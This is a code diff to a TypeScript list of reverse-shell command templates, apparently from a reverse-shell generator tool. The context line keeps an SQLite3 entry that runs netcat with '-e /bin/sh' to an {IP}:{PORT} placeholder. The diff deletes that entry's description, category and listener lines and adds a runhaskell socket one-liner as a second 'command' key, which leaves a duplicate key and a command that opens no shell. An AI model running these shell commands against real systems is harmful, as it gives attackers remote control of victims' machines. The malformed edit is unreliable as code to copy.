@@ -225,12 +225,8 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     name: "SQLite3 nc",
     icon: "🗃️",
     command: "sqlite3 :memory: -cmd '.shell nc {IP} {PORT} -e /bin/sh'",
-    description: "SQLite3 netcat reverse shell",
-    category: "reverse",
-    subcategory: "Shell Tools",
-    os: ["linux"],
-    listener: `nc -lvnp {PORT}
-# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
+    command:
+      "runhaskell -e 'import Network;import System.Process;import Control.Monad(forever);main=withSocketsDo$do s<-connectTo\"{IP}\"(PortNumber {PORT});hSetBuffering s NoBuffering;forever$do hPutStrLn s=<<getLine;hGetLine s>>=putStrLn'",
   },
 
   {
